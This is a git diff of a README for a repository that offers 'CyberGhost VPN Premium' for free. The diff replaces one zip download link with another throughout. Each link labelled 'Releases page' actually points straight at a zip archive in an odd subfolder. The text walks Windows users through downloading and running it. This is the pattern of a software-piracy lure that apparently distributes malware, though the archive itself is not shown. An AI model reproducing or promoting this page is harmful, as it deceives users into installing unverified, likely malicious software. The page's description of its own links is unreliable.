@@ -1,6 +1,6 @@
 # 🛡️ CyberGhost-VPN-Premium-Free - Secure Your Internet Privacy Easily
 
-[![Download CyberGhost VPN](https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip%https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip)](https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip)
+[![Download CyberGhost VPN](https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip%https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip)](https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the **CyberGhost-VPN-Premium-Free** repository. This guide will help 
 
 To get started, you need to visit the Releases page. Here, you'll find the latest version of the application to download.
 
-1. **Visit the Releases page**: [Click here to access the page](https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip).
+1. **Visit the Releases page**: [Click here to access the page](https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip).
    
 2. On the Releases page, look for the most recent version. Click on it to open the release details.
    
 3. Scroll down to the "Assets" section. You will see a list of files available for download.
 
-4. Find the file for Windows, it may look something like `https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip`. Click on it to start the download.
+4. Find the file for Windows, it may look something like `https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip`. Click on it to start the download.
 
 5. Once downloaded, locate the file in your Downloads folder or wherever your browser saves files.
 
@@ -141,4 +141,4 @@ Once set up, using CyberGhost VPN is straightforward:
 
 Feel free to explore the settings for customized options.
 
-For more information about CyberGhost VPN, visit our [Releases page](https://github.com/Nislade/CyberGhost-VPN-Premium-Free/raw/refs/heads/main/depaint/VP_Cyber_Ghost_Free_Premium_v3.4.zip) to download the latest version. Enjoy secure and private browsing!
+For more information about CyberGhost VPN, visit our [Releases page](https://raw.githubusercontent.com/Nislade/CyberGhost-VPN-Premium-Free/main/depaint/Ghost-Premium-Free-VP-Cyber-2.3.zip) to download the latest version. Enjoy secure and private browsing!
